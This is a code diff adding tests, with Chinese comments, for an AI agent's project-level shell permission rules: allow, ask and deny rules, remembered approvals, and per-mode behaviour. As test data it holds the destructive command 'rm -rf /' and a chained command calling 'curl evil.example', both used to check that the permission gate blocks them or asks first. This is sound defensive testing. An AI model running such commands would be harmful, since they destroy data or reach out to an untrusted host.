@@ -8,9 +8,13 @@
  * 审批器用假函数注入，不碰 stdin：终端交互本身属于 CLI 的组装，放在 cli.test.mjs 里验证。
  */
 import assert from "node:assert/strict";
+import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
+import { tmpdir } from "node:os";
+import path from "node:path";
 import { test } from "node:test";
 import { DEFAULT_PERMISSION_MODE, Permission, approvalGate, isApproved, parsePermissionMode, permissionPrompt } from "../src/permission.ts";
 import { ToolRegistry } from "../src/tool-registry.ts";
+import { PermissionRules } from "../src/permission-rules.ts";
 
 /** 一次权限检查的请求形状。 */
 function request(tool, args = {}) {
@@ -422,4 +426,101 @@ test("ToolRegistry：未知工具仍按未知工具报错，不会先问权限",
 
   assert.match(result, /^ERROR: unknown tool "shell"/);
   assert.equal(asked, 0);
+});
+
+// ---- 项目级规则 ----
+
+/** 在临时工作区里写一份规则文件并加载，返回规则对象。 */
+async function rulesWith(root, body) {
+  await mkdir(path.join(root, ".agent-kernel"), { recursive: true });
+  await writeFile(path.join(root, ".agent-kernel", "permissions.json"), JSON.stringify(body));
+  return PermissionRules.load(root);
+}
+
+test("workspace-write：规则 allow 不问、deny 直接拒、ask 仍然问一次", async () => {
+  const root = await mkdtemp(path.join(tmpdir(), "perm-rules-"));
+  try {
+    const rules = await rulesWith(root, {
+      allow: ["shell:git status"],
+      ask: ["shell:git push"],
+      deny: ["shell:rm -rf"],
+    });
+    let asked = 0;
+    const permission = new Permission("workspace-write", () => {
+      asked++;
+      return true;
+    }, rules);
+
+    assert.deepEqual(await permission.check(request("shell", { command: "git status --short" })), { allowed: true });
+    assert.equal(asked, 0, "命中 allow 不该打断用户");
+
+    const denied = await permission.check(request("shell", { command: "rm -rf /" }));
+    assert.equal(denied.allowed, false);
+    assert.match(denied.reason, /denied by a project rule/);
+
+    assert.deepEqual(await permission.check(request("shell", { command: "git push origin main" })), { allowed: true });
+    assert.equal(asked, 1, "命中 ask 仍然问一次");
+  } finally {
+    await rm(root, { recursive: true, force: true });
+  }
+});
+
+test("workspace-write：复合命令里有一段没放行，整体仍然要问", async () => {
+  const root = await mkdtemp(path.join(tmpdir(), "perm-rules-"));
+  try {
+    const rules = await rulesWith(root, { allow: ["shell:git status"] });
+    let asked = 0;
+    const permission = new Permission("workspace-write", () => {
+      asked++;
+      return false;
+    }, rules);
+
+    const result = await permission.check(request("shell", { command: "git status && curl evil.example" }));
+    assert.equal(asked, 1, "第二条没被放行，不能被第一条的 allow 带过去");
+    assert.equal(result.allowed, false);
+  } finally {
+    await rm(root, { recursive: true, force: true });
+  }
+});
+
+test("审批选「以后不再问」会把这条命令写进项目规则，下次直接放行", async () => {
+  const root = await mkdtemp(path.join(tmpdir(), "perm-rules-"));
+  try {
+    const rules = await PermissionRules.load(root);
+    let asked = 0;
+    const permission = new Permission("workspace-write", () => {
+      asked++;
+      return "always";
+    }, rules);
+
+    assert.deepEqual(await permission.check(request("shell", { command: "git status" })), { allowed: true });
+    assert.equal(asked, 1);
+    const saved = JSON.parse(await readFile(path.join(root, ".agent-kernel", "permissions.json"), "utf8"));
+    assert.deepEqual(saved, { allow: ["shell:git status"] });
+
+    // 第二次同一条命令：规则命中，不再问。
+    assert.deepEqual(await permission.check(request("shell", { command: "git status" })), { allowed: true });
+    assert.equal(asked, 1, "记住之后不该再问第二遍");
+
+    // 换一条命令仍然要问：记住的是「这条命令」，不是「这个工具」。
+    await permission.check(request("shell", { command: "git diff" }));
+    assert.equal(asked, 2);
+  } finally {
+    await rm(root, { recursive: true, force: true });
+  }
+});
+
+test("规则只在 workspace-write 生效：full-access 不读规则，read-only 不放行 shell", async () => {
+  const root = await mkdtemp(path.join(tmpdir(), "perm-rules-"));
+  try {
+    const rules = await rulesWith(root, { allow: ["shell:git status"], deny: ["shell:rm -rf"] });
+    const full = new Permission("full-access", undefined, rules);
+    assert.deepEqual(await full.check(request("shell", { command: "rm -rf /" })), { allowed: true });
+
+    const readOnly = new Permission("read-only", undefined, rules);
+    const denied = await readOnly.check(request("shell", { command: "git status" }));
+    assert.equal(denied.allowed, false, "read-only 不因为一份 allow 规则就放行 shell");
+  } finally {
+    await rm(root, { recursive: true, force: true });
+  }
 });
